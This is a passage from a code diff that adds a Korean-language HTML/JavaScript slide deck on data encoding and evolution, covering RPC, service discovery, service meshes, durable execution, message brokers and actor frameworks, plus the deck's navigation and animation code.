+    <td>함수 호출보다 훨씬 느리고, 네트워크 상태에 따라 <strong>지연이 극도로 가변적</strong></td>
+  </tr>
+  <tr>
+    <td><b>⑤ 매개변수 전달</b></td>
+    <td>로컬 메모리 객체에 대한 <strong>참조</strong>를 효율적으로 전달 가능</td>
+    <td>모든 매개변수를 네트워크로 보낼 수 있는 <strong>바이트 시퀀스로 인코딩</strong>. 큰 데이터, 가변 객체에서 문제</td>
+  </tr>
+  <tr>
+    <td><b>⑥ 언어 간 타입 변환</b></td>
+    <td>단일 언어·단일 프로세스에는 문제 없음</td>
+    <td>클라이언트와 서비스가 <strong>다른 언어로 구현</strong>될 수 있어 RPC 프레임워크가 한 언어의 데이터 타입을 다른 언어로 변환. 모든 언어가 같은 타입을 갖지 않으므로 추해질 수 있음 (ex. JavaScript 2<sup>53</sup> 초과 숫자 문제)</td>
+  </tr>
+</table>
+
+<div class="note"><b>결론</b> · <i>원격 서비스를 로컬 객체와 유사하게 만들려는 시도는 무의미</i>하다 — 근본적으로 다르기 때문임.</div>
+
+<div class="card gold">
+  <h3>REST와 RPC의 철학 차이</h3>
+  <ul>
+    <li><strong>RPC</strong> · 네트워크 동작을 <em>숨기려고</em> 한다</li>
+    <li><strong>REST</strong> · 네트워크 동작은 <em>다른 것임을 인정</em>하고 함수 호출과 별개로 구별한다</li>
+  </ul>
+</div>
+</div>`});
+
+/* ---- 32. Load balancers, service discovery, service mesh ---- */
+slides.push({sec:"Dataflow", title:"로드밸런서·서비스 디스커버리·서비스 메시", html:`
+<div class="kicker">2-2. Load Balancers, Service Discovery, Service Meshes</div>
+<h1>서비스를 찾고 분산하기</h1>
+<div class="scroll">
+<p class="lead">모든 서비스는 네트워크로 통신한다 → 클라이언트는 연결하려는 서비스의 주소를 알아야 함 = <strong>서비스 디스커버리</strong> 문제.</p>
+
+<p>가장 단순하게는, 서비스가 실행 중인 <strong>IP 주소와 포트</strong>에 연결하도록 설정하는 방법. 작동은 하지만, 서버의 오프라인 전환·머신 이동·과부하 상태 등에서 <em>수동 재설정</em>이 필요함.</p>
+
+<div class="card teal">
+  <h3>부하 분산 (Load Balancing)</h3>
+  <p>높은 가용성·확장성을 위해 <strong>여러 머신에서 서비스의 여러 인스턴스가 실행</strong>됨. 부하 분산은 이 인스턴스들에 요청을 적절히 분산하는 것.</p>
+</div>
+
+<h3>여러 솔루션</h3>
+<div class="cols">
+  <div class="card accent">
+    <span class="pill r">①</span>
+    <h3>Hardware Load Balancers</h3>
+    <ul>
+      <li>데이터 센터에 설치되는 <strong>전용 장비</strong></li>
+      <li>들어오는 연결이 서비스가 실행되고 있는 하나의 서버로 라우팅되도록 함</li>
+      <li>네트워크 장애를 감지하여 다른 서버로 트래픽을 전환하기도 함</li>
+    </ul>
+  </div>
+  <div class="card accent">
+    <span class="pill r">②</span>
+    <h3>Software Load Balancers</h3>
+    <p class="mini">하드웨어와 유사한 방식. 표준 머신에 설치 가능한 애플리케이션.</p>
+    <p class="mini"><b>ex)</b> NGINX, HAProxy</p>
+  </div>
+</div>
+<div class="cols">
+  <div class="card teal">
+    <span class="pill t">③</span>
+    <h3>DNS</h3>
+    <ul>
+      <li>단일 도메인 이름에 여러 IP 주소를 연결해 부하 분산</li>
+      <li>클라이언트는 IP 대신 도메인 이름으로 연결</li>
+      <li><b>단점</b> · DNS는 IP를 캐시하고 변경을 전파하는 데에 <strong>오랜 시간</strong>이 걸리기 때문에 클라이언트가 <em>오래된(stale) IP</em>를 보게 될 수 있음</li>
+    </ul>
+  </div>
+  <div class="card teal">
+    <span class="pill t">④</span>
+    <h3>Service Discovery Systems</h3>
+    <ul>
+      <li>DNS 대신 <strong>중앙 레지스트리</strong>(etcd, Apache ZooKeeper 등) 사용</li>
+      <li>서비스는 주기적으로 <strong>heartbeat</strong> 신호를 보내서 사용 가능함을 알림</li>
+      <li>DNS 대비 장점 · 서비스 인스턴스가 자주 바뀌는 <strong>동적인 환경</strong>에 유리. 더 많은 메타데이터를 제공하여 똑똑한 부하 분산 결정 가능</li>
+    </ul>
+  </div>
+</div>
+</div>`});
+
+/* ---- 33. Service Mesh ---- */
+slides.push({sec:"Dataflow", title:"Service Mesh", html:`
+<div class="kicker">2-2. Service Meshes</div>
+<h1>Service Mesh — Sidecar로 분리된 통신 레이어</h1>
+<div class="scroll">
+<div class="card teal">
+  <h3>Service Mesh 란?</h3>
+  <p>소프트웨어 로드밸런서와 서비스 디스커버리를 결합한 형태. 별도 머신에서 동작하는 전통 로드밸런서와 달리,</p>
+  <ul>
+    <li><strong>in-process client library</strong> (같은 프로세스 안에서 함께 실행되는 라이브러리 형태)</li>
+    <li>또는 서버 인스턴스와 함께 실행되는 <strong>sidecar 컨테이너</strong>로 배포</li>
+  </ul>
+</div>
+
+<div class="card accent">
+  <h3>연결 흐름</h3>
+<pre style="margin:6px 0">클라이언트 앱 → local service load balancer → server's load balancer → local server process</pre>
+<pre>[ 서비스 A 컨테이너 ]            [ 서비스 B 컨테이너 ]
+   App A  ──┐                       ┌── App B
+            │ (localhost)           │ (localhost)
+        [ 사이드카 A ] ───네트워크───> [ 사이드카 B ]</pre>
+</div>
+
+<div class="card gold">
+  <h3>복잡하지만 다음의 이점이 있다</h3>
+  <ul>
+    <li>클라이언트-서버가 <strong>로컬 연결</strong>을 통해 라우팅 → <strong>연결 암호화를 로드밸런서 레벨</strong>에서 처리 가능 → 클라이언트·서버가 SSL 인증서 등을 다룰 필요 없음</li>
+    <li>정교한 <strong>관측성(observability)</strong> 제공 — 어떤 서비스가 서로 호출하는지 실시간 추적, 장애 감지, 트래픽 부하 추적 등</li>
+  </ul>
+</div>
+
+<h3>어떤 것을 선택해야 하는가?</h3>
+<div class="cols3">
+  <div class="card">
+    <b>Kubernetes 같은 오케스트레이터<br>매우 동적인 환경</b>
+    <p class="mini">→ <strong>Service Mesh</strong> (ex. Istio, Linkerd)</p>
+  </div>
+  <div class="card">
+    <b>DB, 메시징 같은 특수 인프라</b>
+    <p class="mini">→ <strong>목적 특화 로드밸런서</strong> (ex. MySQL의 ProxySQL, Vitess의 VTGate — 쿼리를 받아 어느 샤드로 보낼지 라우팅)</p>
+  </div>
+  <div class="card">
+    <b>단순 배포</b>
+    <p class="mini">→ <strong>소프트웨어 로드밸런서</strong></p>
+  </div>
+</div>
+</div>`});
+
+/* ---- 34. RPC compatibility ---- */
+slides.push({sec:"Dataflow", title:"RPC의 데이터 인코딩과 진화", html:`
+<div class="kicker">2-2. Data Encoding &amp; Evolution for RPC</div>
+<h1>RPC의 호환성 — 요청/응답 비대칭</h1>
+<div class="scroll">
+<p class="lead">진화 가능성을 위해 RPC 클라이언트와 서버는 <strong>독립적으로 변경/배포</strong>될 수 있어야 함.</p>
+
+<div class="card teal">
+  <h3>DB와 다른, 단순화된 가정</h3>
+  <p>서비스 데이터 흐름에서는 단순화된 가정을 할 수 있음.</p>
+  <p style="font-style:italic;color:var(--accent)">→ <strong>모든 서버가 먼저 업데이트되고, 그 다음 모든 클라이언트가 업데이트됨.</strong></p>
+  <p>이 가정으로부터의 결론은,</p>
+  <p style="font-style:italic;color:var(--accent)">→ <strong>요청(request)에는 하위 호환성만, 응답(response)에는 상위 호환성만</strong> 필요함.</p>
+</div>
+
+<pre>서버가 업그레이드 되었고(새 코드), 클라이언트는 아직 그대로(옛 코드)라고 가정하면
+
+→ <span class="k">요청</span>: 옛 클라이언트가 보냄(옛 형식) → 새 서버가 읽음
+   = 새 코드가 옛 데이터 읽기 = <span class="s">하위 호환성</span>
+
+→ <span class="k">응답</span>: 새 서버가 보냄(새 형식) → 옛 클라이언트가 읽음
+   = 옛 코드가 새 데이터 읽기 = <span class="s">상위 호환성</span></pre>
+
+<div class="card accent">
+  <h3>호환성은 인코딩 형식에서 상속된다</h3>
+  <p>RPC 방식의 하위/상위 호환성 속성은 그 RPC가 사용하는 <strong>인코딩으로부터 상속</strong>됨.</p>
+</div>
+
+<div class="cols3">
+  <div class="card">
+    <b>gRPC (Protocol Buffers)</b>
+    <p class="mini"><strong>태그 번호 규칙</strong>으로 처리</p>
+  </div>
+  <div class="card">
+    <b>Avro RPC</b>
+    <p class="mini"><strong>writer/reader 스키마 해석</strong>으로 처리</p>
+  </div>
+  <div class="card">
+    <b>RESTful API</b>
+    <p class="mini">보통 JSON. <strong>선택적 요청 매개변수 추가, 응답 객체에 새 필드 추가</strong>는 호환성 유지 변경으로 간주</p>
+  </div>
+</div>
+</div>`});
+
+/* ---- 35. ANIM: RPC compat ---- */
+slides.push({sec:"Dataflow", title:"애니메이션 · RPC 호환성", anim:"rpccompat", html:`
+<div class="kicker">Animation · RPC Compatibility Direction</div>
+<h1>RPC 호환성 — 어느 방향이 어느 호환성?</h1>
+<p class="lead" style="margin-bottom:6px">서버가 먼저 업그레이드되었다고 가정 — 클라이언트(옛)와 서버(새) 사이의 요청과 응답이 각각 어느 호환성을 요구하는지 시각화함.</p>
+
+<div class="anim-stage">
+  <div class="rpc-flow">
+    <div class="rpc-box outdated" id="rpcClient">
+      <div class="role">CLIENT</div>
+      <div class="ver">옛 버전</div>
+      <p class="note">아직 업그레이드 안 됨</p>
+    </div>
+    <div class="rpc-mid">
+      <div class="rpc-arrow req" id="rpcReq">→ Request →</div>
+      <div class="rpc-arrow res" id="rpcRes">← Response ←</div>
+    </div>
+    <div class="rpc-box upgraded" id="rpcServer">
+      <div class="role">SERVER</div>
+      <div class="ver">새 버전</div>
+      <p class="note">먼저 업그레이드됨</p>
+    </div>
+  </div>
+  <div class="anim-ctrl">
+    <button id="rpcReqBtn">▶ 요청 보내기 (옛 → 새)</button>
+    <button id="rpcResBtn">▶ 응답 받기 (새 → 옛)</button>
+    <button id="rpcReset">↻ 리셋</button>
+    <span class="status" id="rpcStatus">버튼을 눌러 시연하세요</span>
+  </div>
+</div>
+
+<div class="card gold" style="margin-top:14px">
+  <h3>조직 경계를 넘는 호환성의 어려움</h3>
+  <ul>
+    <li>조직 경계를 넘어서 서비스가 사용되는 경우, 클라이언트를 통제할 수 없고 업그레이드 강제가 어려움 → <strong>호환성을 무기한 유지</strong>해야 할 수도 있음</li>
+    <li>여러 버전의 서비스 API를 <strong>나란히 유지</strong>하는 경우가 생김</li>
+  </ul>
+</div>
+
+<div class="card teal">
+  <h3>API 버전 관리 — 합의된 표준 없음, 흔한 접근법</h3>
+  <ul>
+    <li><strong>URL에 버전 번호 사용</strong> (예: <code>/v1/users</code>, <code>/v2/users</code>)</li>
+    <li>HTTP <strong>Accept 헤더</strong>에 버전 표시</li>
+    <li>API 키로 클라이언트를 식별하는 서비스 — API 키로 서로 다른 버전 제공</li>
+  </ul>
+</div>
+`});
+
+/* ---- 36. Durable execution intro ---- */
+slides.push({sec:"Dataflow", title:"Durable Execution과 Workflow", html:`
+<div class="kicker">2-3. Durable Execution and Workflows</div>
+<h1>Durable Execution과 Workflow</h1>
+<div class="scroll">
+<p class="lead">서비스 기반 아키텍처는 정의상 애플리케이션의 서로 다른 부분을 담당하는 <strong>여러 서비스</strong>로 구성됨.</p>
+
+<div class="card teal">
+  <h3>결제 시스템 예시 — 단일 결제 처리에 여러 서비스 호출 필요</h3>
+<pre style="margin:6px 0">결제 처리 서비스
+  → 사기 탐지 서비스 호출 (사기 확인)
+  → 신용카드 서비스 호출 (카드에서 출금)
+  → 은행 서비스 호출   (출금된 자금 입금)</pre>
+</div>
+
+<div class="card accent">
+  <h3>Workflow란?</h3>
+  <ul>
+    <li>위와 같은 일련의 단계를 <strong>워크플로</strong>라 함</li>
+    <li>각 단계 = <strong>태스크(task)</strong></li>
+    <li>워크플로는 보통 <strong>태스크들의 그래프</strong>로 정의됨</li>
+    <li>워크플로 정의는 범용 프로그래밍 언어, DSL, BPEL(Business Process Execution Language) 등으로 작성 가능</li>
+    <li>워크플로 엔진마다 태스크(task)를 부르는 명칭이 조금씩 다름</li>
+  </ul>
+</div>
+
+<div class="cols">
+  <div class="card gold">
+    <h3>워크플로 엔진의 결정 사항</h3>
+    <p>워크플로는 <strong>워크플로 엔진</strong>에 의해 실행됨. 엔진은 다음을 결정함.</p>
+    <ul>
+      <li>각 태스크를 <strong>언제, 어느 머신</strong>에서 실행할지</li>
+      <li>태스크 <strong>실패 시</strong> 어떻게 할지</li>
+      <li>몇 개의 태스크를 <strong>병렬 실행</strong> 허용할지</li>
+    </ul>
+  </div>
+  <div class="card teal">
+    <h3>워크플로 엔진의 구성</h3>
+    <ul>
+      <li><strong>오케스트레이터(orchestrator)</strong> · 태스크 스케줄링 담당</li>
+      <li><strong>익스큐터(executor)</strong> · 태스크 실행 담당</li>
+    </ul>
+    <p class="mini">워크플로의 실행은 다음 시점에 실행될 수 있다:</p>
+    <ul>
+      <li>시간 기반 스케줄</li>
+      <li>외부 소스(웹 서비스, 인간 등)</li>
+    </ul>
+  </div>
+</div>
+
+<h3>워크플로 엔진의 종류</h3>
+<div class="cols3">
+  <div class="card">
+    <b>데이터 시스템 연동</b>
+    <p class="mini">ex) Airflow, Dagster, Prefect<br><b>용도</b> · ETL 태스크 오케스트레이션</p>
+  </div>
+  <div class="card">
+    <b>그래픽 표기 제공</b>
+    <p class="mini">ex) Camunda, Orkes<br><b>용도</b> · 비엔지니어도 BPMN(Business Process Model and Notation)으로 워크플로 정의 가능</p>
+  </div>
+  <div class="card">
+    <b>지속 실행 제공</b>
+    <p class="mini">ex) Temporal, Restate<br><b>용도</b> · <strong>durable execution</strong></p>
+  </div>
+</div>
+</div>`});
+
+/* ---- 37. Durable execution mechanics ---- */
+slides.push({sec:"Dataflow", title:"Durable Execution 원리", html:`
+<div class="kicker">2-3. Durable Execution</div>
+<h1>Durable Execution — 정확히 한 번(exactly once)</h1>
+<div class="scroll">
+<p class="lead"><strong>지속 실행 프레임워크</strong> · 트랜잭션성이 필요한 서비스 기반 아키텍처를 구축하는 인기 있는 방법.</p>
+
+<div class="card accent">
+  <h3>문제 상황</h3>
+  <ul>
+    <li>각 결제를 <strong>정확히 한 번(exactly once)</strong> 처리하고 싶음</li>
+    <li>워크플로 실행 중 실패하면 → <strong>신용카드는 청구됐는데 은행 입금은 안 되는</strong> 상황 발생</li>
+    <li>서비스 기반(service-based) 아키텍처에서는 두 태스크를 단순히 하나의 DB 트랜잭션으로 감쌀 수 없음</li>
+    <li>심지어 통제 권한이 없는 <strong>서드파티 결제 게이트웨이</strong>와 상호작용할 수도 있음</li>
+  </ul>
+</div>
+
+<div class="card teal">
+  <h3>해결 방법 — 정확히 한 번 처리</h3>
+  <ul>
+    <li>태스크가 실패하면</li>
+    <li>프레임워크가 태스크를 재실행하되, <strong>실패 전에 성공적으로 수행한 호출이나 상태 변경은 건너뜀</strong> — 해당 호출을 하는 척하면서 이전의 호출 결과를 반환</li>
+  </ul>
+  <p>이런 동작이 가능한 이유는,</p>
+  <ul>
+    <li>지속 실행 프레임워크가 모든 RPC 및 상태 변경을 <strong>WAL(write-ahead log)</strong>에 기록하기 때문</li>
+  </ul>
+</div>
+
+<div class="note"><b>핵심 비유</b> · WAL은 "이미 처리한 단계의 영수증" — 재실행할 때 영수증이 있는 단계는 건너뛰고 다음 단계부터 다시 시도함.</div>
+</div>`});
+
+/* ---- 38. ANIM: Durable execution replay ---- */
+slides.push({sec:"Dataflow", title:"애니메이션 · Durable Execution 재실행", anim:"workflow", html:`
+<div class="kicker">Animation · Durable Execution Replay</div>
+<h1>실패 후 재실행 — 영수증 있는 단계는 건너뛴다</h1>
+<p class="lead" style="margin-bottom:6px">결제 워크플로가 3번째 단계에서 실패한다고 가정 — 재실행 시 어떻게 진행되는지 단계별로 시각화함.</p>
+<div class="anim-stage">
+  <div class="wf-tasks" id="wfTasks"></div>
+  <div class="anim-ctrl">
+    <button id="wfNext">▶ 다음 단계</button>
+    <button id="wfFail">✗ 3번째에서 실패</button>
+    <button id="wfReplay">↻ 재실행 (WAL 활용)</button>
+    <button id="wfReset">⟲ 처음부터</button>
+    <span class="status" id="wfStatus">시작하려면 '다음 단계'를 누르세요</span>
+  </div>
+</div>
+<p class="mini" style="margin-top:8px">파란색 = 완료, 노란색 = 실행 중, 빨간색 = 실패, 회색 점선 = WAL 영수증으로 건너뜀.</p>
+`});
+
+/* ---- 39. Durable execution challenges ---- */
+slides.push({sec:"Dataflow", title:"Durable Execution의 도전 과제", html:`
+<div class="kicker">2-3. Challenges of Durable Execution</div>
+<h1>Durable Execution의 도전 과제</h1>
+<div class="scroll">
+<p class="lead">Temporal 같은 지속 실행 프레임워크에도 어려움이 있음.</p>
+
+<div class="cols3">
+  <div class="card accent">
+    <span class="pill r">① 멱등성</span>
+    <h3>멱등성 요구</h3>
+    <p>결제 게이트웨이 같은 <strong>서드파티 서비스가 멱등(idempotent)</strong>한 API를 제공해야 함.</p>
+    <p class="mini">같은 요청을 두 번 보내도 한 번 보낸 것과 동일한 결과여야 함.</p>
+  </div>
+  <div class="card gold">
+    <span class="pill g">② 취약성</span>
+    <h3>코드 변경의 취약성 (중요)</h3>
+    <ul>
+      <li>지속 실행 프레임워크는 각 RPC 호출을 <strong>순서대로 기록</strong> → 재실행 시 같은 RPC 호출 순서를 기대</li>
+      <li>위와 같은 이유로 <strong>코드 변경에 취약</strong> (단순 호출 순서만 바꿔도 전체 동작에 문제)</li>
+      <li><b>안전한 방법</b> · 기존 워크플로 코드를 수정하는 대신, 새 버전 코드를 별도로 배포 (재실행을 위한 옛 버전 코드 유지)</li>
+    </ul>
+  </div>
+  <div class="card teal">
+    <span class="pill t">③ 결정론</span>
+    <h3>결정론(determinism) 요구</h3>
+    <ul>
+      <li>지속 실행 프레임워크는 <strong>결정론적 재생</strong>을 기대 (같은 입력에 대한 같은 출력)</li>
+      <li>따라서 <strong>난수 생성기, 시계 호출</strong> 같은 비결정론적 코드가 문제</li>
+      <li>이런 비결정론적 코드가 존재하는지 탐지하는 <strong>정적 분석 도구</strong>도 제공됨 (ex. Temporal의 Workflow Check)</li>
+    </ul>
+  </div>
+</div>
+
+<div class="note"><b>요점</b> · "그냥 다시 돌리면 된다"는 강력한 보장 뒤에는 — 멱등성, 코드 안정성, 결정론이라는 세 가지 규율이 필요함.</div>
+</div>`});
+
+/* ---- 40. Event-Driven Architectures ---- */
+slides.push({sec:"Dataflow", title:"이벤트 기반 아키텍처", html:`
+<div class="kicker">2-4. Event-Driven Architectures</div>
+<h1>이벤트 기반 아키텍처 — 보내고 잊는다</h1>
+<div class="scroll">
+<p class="lead">마지막 데이터플로 방식은 <strong>이벤트 기반 아키텍처(event-driven architecture)</strong>임. 요청은 <strong>이벤트(event)</strong> 또는 <strong>메시지(message)</strong>라 불림.</p>
+
+<div class="card accent">
+  <h3>RPC와의 핵심 차이</h3>
+  <ul>
+    <li>송신자가 수신자의 이벤트 처리를 <strong>기다리지 않음</strong></li>
+    <li>이벤트는 직접 네트워크 연결로 보내지 않고 <strong>메시지 브로커(message broker)</strong>라는 중개자를 거침</li>
+  </ul>
+</div>
+
+<div class="arrowflow">
+  <span class="b">송신자(Producer)</span><span class="a">→</span><span class="b" style="background:#fff8e6;border-color:var(--gold)">메시지 브로커</span><span class="a">→</span><span class="b">수신자(Consumer)</span>
+</div>
+
+<div class="card teal">
+  <h3>메시지 브로커의 장점 (RPC 대비)</h3>
+  <ul>
+    <li><strong>버퍼 역할</strong> · 수신자 서비스가 사용 불가일 때 완충 작용을 하여 시스템 신뢰성 향상</li>
+    <li><strong>자동 재전달</strong> · 메시지 자동 재전달이 가능하여 손실 방지</li>
+    <li><strong>서비스 디스커버리 불필요</strong> · 송신자가 수신자를 찾지 않아도 됨</li>
+    <li><strong>다중 수신자</strong> · 같은 메시지를 여러 수신자에게 전송 가능</li>
+    <li><strong>논리적 분리(decoupling)</strong> · 송신자는 발행, 수신자는 구독만 (서로 독립적)</li>
+  </ul>
+</div>
+
+<div class="card gold">
+  <h3>비동기성</h3>
+  <p>송신자는 메시지 전달을 기다리지 않음. <strong>메시지를 보내고 잊음.</strong></p>
+</div>
+</div>`});
+
+/* ---- 41. Message brokers ---- */
+slides.push({sec:"Dataflow", title:"메시지 브로커", html:`
+<div class="kicker">2-4. Message Brokers</div>
+<h1>메시지 브로커 — 시장의 변천사</h1>
+<div class="scroll">
+<h3>시대별로 시장을 지배하던 브로커들</h3>
+<div class="cols3">
+  <div class="card">
+    <b>과거 (상업용)</b>
+    <p class="mini">TIBCO, IBM WebSphere, webMethods, ...</p>
+  </div>
+  <div class="card">
+    <b>이후 (오픈소스)</b>
+    <p class="mini">RabbitMQ, ActiveMQ, Apache Kafka, ...</p>
+  </div>
+  <div class="card">
+    <b>최근 (클라우드 서비스)</b>
+    <p class="mini">Amazon Kinesis, Azure Service Bus, Google Cloud Pub/Sub, ...</p>
+  </div>
+</div>
+
+<h3>자주 사용되는 메시지 분배 패턴</h3>
+<div class="tradeoff">
+  <div class="l">
+    <span class="pill r">Queue</span>
+    <h4>큐(Queue)</h4>
+    <p>한 프로세스가 큐에 메시지 추가 → 소비자가 받음.</p>
+    <p>(소비자가 여럿이면 그중 <strong>하나</strong>가 받음)</p>
+  </div>
+  <div class="r">
+    <span class="pill t">Topic</span>
+    <h4>토픽(Topic)</h4>
+    <p>한 프로세스가 토픽에 메시지 발행 → 브로커가 <strong>모든 구독자</strong>에게 전달.</p>
+  </div>
+</div>
+
+<div class="card accent">
+  <h3>인코딩과 호환성</h3>
+  <p>메시지 브로커는 특정 데이터 모델을 강제하지 않음 → <strong>어떤 인코딩 형식도 사용 가능</strong>.</p>
+  <p>흔한 형식으로는:</p>
+  <ul>
+    <li><strong>Protocol Buffers, Avro, JSON + 브로커 옆에 Schema Registry</strong> 배포 — 유효한 스키마 버전 저장 및 호환성 검사</li>
+    <li><strong>AsyncAPI</strong> (OpenAPI의 메시징 버전)로 메시지 스키마 명세 가능</li>
+  </ul>
+</div>
+
+<div class="card teal">
+  <h3>메시지 내구성</h3>
+  <ul>
+    <li>대부분의 브로커가 메시지를 <strong>디스크에 기록</strong> → 메시지 손실 방지</li>
+    <li>많은 브로커는 메시지가 소비된 후 메시지를 <strong>자동 삭제</strong></li>
+    <li>몇몇 브로커는 메시지를 <strong>무기한 저장</strong>하도록 설정 가능</li>
+  </ul>
+</div>
+
+<div class="note"><b>주의</b> · 컨슈머가 만약 다른 토픽으로 메시지를 재발행한다면, 앞에서 봤던 데이터베이스 맥락에서처럼 <strong>알 수 없는 필드를 보존</strong>하도록 주의해야 함.</div>
+</div>`});
+
+/* ---- 42. Distributed actor frameworks ---- */
+slides.push({sec:"Dataflow", title:"분산 액터 프레임워크", html:`
+<div class="kicker">2-4. Distributed Actor Frameworks</div>
+<h1>분산 액터 프레임워크</h1>
+<div class="scroll">
+<div class="card teal">
+  <h3>Actor model이란?</h3>
+  <p>단일 프로세스 내 동시성을 위한 프로그래밍 모델.</p>
+  <ul>
+    <li>스레드를 직접 다루지 않고 로직을 <strong>액터(actor)</strong>에 캡슐화 (race condition, locking, deadlock 문제 회피)</li>
+    <li>각 액터는 <strong>로컬 상태</strong>를 가질 수 있고 <strong>비동기 메시지</strong>로 다른 액터와 통신</li>
+    <li>메시지 전달은 <strong>보장되지 않음</strong> (메시지 손실 가능)</li>
+  </ul>
+</div>
+
+<div class="card accent">
+  <h3>Distributed Actor Frameworks (분산 액터 프레임워크)</h3>
+  <p>액터 모델로 애플리케이션을 <strong>여러 노드에 걸쳐 확장</strong>. 송신자/수신자가 같은 노드든 다른 노드든 <strong>동일한 메시지 전달 메커니즘</strong>을 사용.</p>
+  <p>서로 다른 노드라면 메시지가 <strong>투명하게</strong> 인코딩되어 → 네트워크 전송 → 디코딩됨.</p>
+  <p class="mini">여기서 "투명하다"는 <strong>개발자가 그 과정을 직접 신경쓰지 않아도 알아서 처리된다</strong>는 의미 (프레임워크가 처리한다).</p>
+  <p class="mini">대표적으로 Akka, Orleans, Erlang/OTP 등...</p>
+</div>
+
+<div class="card gold">
+  <h3>Location transparency (위치 투명성)</h3>
+  <p>위치 투명성은 RPC보다 actor model에서 더 잘 동작함.</p>
+  <p style="font-style:italic">위치 투명성 = <strong>메시지를 보내는 쪽은 받는 쪽이 같은 머신이든 다른 머신이든 신경 쓸 필요 없이 코드가 동일하게 동작하는 것</strong></p>
+  <p>그래서 RPC보다 actor model이 위치 투명성이 더 나은 이유는,</p>
+  <ul>
+    <li>액터 모델에서는 로컬과 원격 통신 사이의 <strong>근본적 불일치가 적음</strong></li>
+    <li>액터 모델에서는 <strong>로컬을 원격처럼 취급</strong>하므로 간극이 적음 — RPC 근본 문제 우회</li>
+  </ul>
+</div>
+
+<div class="note"><b>호환성 고려는 여전히 필요</b> · 분산 액터 프레임워크는 본질적으로 message broker와 actor model을 하나로 통합함. 만약 액터 기반 애플리케이션에서 <strong>롤링 업그레이드</strong>를 하려고 한다면, 상위/하위 호환성을 걱정해야 함 — 새 버전 노드가 옛 버전 노드로(또는 그 반대로) 메시지를 보낼 수 있으므로.</div>
+</div>`});
+
+/* ---- 43. Summary ---- */
+slides.push({sec:"Summary", title:"요약", html:`
+<div class="kicker">3. Summary</div>
+<h1>핵심 요약</h1>
+<div class="scroll">
+<pre style="font-size:13px;line-height:1.7">변화는 필연 (헤라클레이토스)
+        ↓
+진화 가능성을 위해 롤링 업그레이드 필요
+        ↓
+→ 옛/새 버전 코드가 반드시 공존
+        ↓
+→ 모든 데이터에 양방향 호환성 필수
+   (하위: 새 코드가 옛 데이터 / 상위: 옛 코드가 새 데이터)
+        ↓
+→ 그 호환성을 어떤 인코딩으로 달성하나?
+   언어내장(❌) / 텍스트(△·보편) / 이진스키마(✅·균형)
+        ↓
+→ 어떤 데이터플로에서든 동일하게 적용
+   DB / RPC·REST / 이벤트(브로커·액터)
+        ↓
+결론: 약간의 주의로 충분히 달성 가능. 자주 배포하라.</pre>
+
+<h3>기억할 만한 내용</h3>
+<div class="cols">
+  <div class="card accent">
+    <h3>① 인코딩은 아키텍처 결정</h3>
+    <p class="mini">바이트를 어떻게 표현하느냐를 정하는 것이 시스템을 어떻게 진화시킬지 결정함.</p>
+  </div>
+  <div class="card teal">
+    <h3>② 버전 공존은 예외가 아닌 기본 가정</h3>
+    <p class="mini">옛 코드와 새 코드는 항상 공존하며, 양방향 호환성은 선택이 아닌 필수.</p>
+  </div>
+  <div class="card gold">
+    <h3>③ 누가 인코딩하고 누가 디코딩하는가?</h3>
+    <p class="mini">DB, 서비스, 이벤트 각 데이터플로에서 누가 인코딩하고 누가 디코딩하는지가 다를 뿐, 어디에서든 호환성 문제가 있음.</p>
+  </div>
+  <div class="card blue">
+    <h3>④ 해결은 가능하다</h3>
+    <p class="mini">적절한 인코딩(특히 스키마 기반), 약간의 규율로 타협과 해결이 가능함.</p>
+  </div>
+</div>
+</div>`});
+
+/* ---- 44. Closing ---- */
+slides.push({sec:"Summary", title:"끝", html:`
+<div class="slide-inner" style="justify-content:center;align-items:center;text-align:center">
+  <div class="kicker" style="justify-content:center">End of Chapter 5</div>
+  <h1 style="font-size:clamp(40px,6vw,86px)">Encoding<br>&amp; Evolution</h1>
+  <p class="lead" style="max-width:680px;margin-top:18px">"약간의 주의를 기울이면, 상위/하위 호환성과 롤링 업그레이드는 충분히 달성 가능함."</p>
+  <div class="quote-box" style="margin-top:30px;text-align:left">
+    <p>May your application's evolution be rapid<br>and your deployments be frequent.</p>
+    <cite>— 여러분 애플리케이션의 진화가 빠르고, 배포가 잦기를</cite>
+  </div>
+  <div class="deco-num" style="left:auto;right:40px;bottom:-50px">∎</div>
+</div>`});
+
+
+/* ============================================================
+   RENDER + NAV
+   ============================================================ */
+const deck=document.getElementById('deck');
+slides.forEach((s,i)=>{
+  const el=document.createElement('section');
+  el.className='slide';el.id='slide'+i;
+  el.innerHTML = s.html.includes('slide-inner') ? s.html : `<div class="slide-inner">${s.html}</div>`;
+  deck.appendChild(el);
+});
+let cur=0;const total=slides.length;
+const counter=document.getElementById('counter');
+const prog=document.getElementById('progress');
+const pv=document.getElementById('prev'),nx=document.getElementById('next');
+function pad(n){return String(n).padStart(2,'0')}
+function show(n){
+  n=Math.max(0,Math.min(total-1,n));
+  document.querySelectorAll('.slide').forEach(s=>s.classList.remove('active'));
+  document.getElementById('slide'+n).classList.add('active');
+  cur=n;
+  counter.textContent=pad(n+1)+' / '+pad(total);
+  prog.style.width=((n)/(total-1)*100)+'%';
+  pv.disabled=n===0;nx.disabled=n===total-1;
+  initAnim(n);
+  document.getElementById('slide'+n).querySelector('.scroll')?.scrollTo(0,0);
+}
+pv.onclick=()=>show(cur-1);nx.onclick=()=>show(cur+1);
+document.addEventListener('keydown',e=>{
+  if(document.getElementById('toc').classList.contains('open')){if(e.key==='Escape')toc.classList.remove('open');return;}
+  if(e.key==='ArrowRight'||e.key==='PageDown'||e.key===' ')show(cur+1);
+  if(e.key==='ArrowLeft'||e.key==='PageUp')show(cur-1);
+  if(e.key==='Home')show(0);if(e.key==='End')show(total-1);
+});
+
+/* TOC */
+const toc=document.getElementById('toc'),tocGrid=document.getElementById('tocGrid');
+slides.forEach((s,i)=>{
+  const d=document.createElement('div');d.className='toc-item';
+  d.innerHTML=`<span class="n">${pad(i+1)}</span><span class="t">${s.title}<br><span style="font-size:11px;color:var(--muted)">${s.sec}</span></span>`;
+  d.onclick=()=>{show(i);toc.classList.remove('open')};
+  tocGrid.appendChild(d);
+});
+document.getElementById('tocBtn').onclick=()=>toc.classList.add('open');
+document.getElementById('tocClose').onclick=()=>toc.classList.remove('open');
+
+/* ============================================================
+   ANIMATIONS
+   ============================================================ */
+const animState={};
+function initAnim(n){
+  const s=slides[n];if(!s.anim)return;
+  if(s.anim==='compat'&&!animState.compat)setupCompat();
+  if(s.anim==='sizebar'&&!animState.sizebar)setupSizeBar();
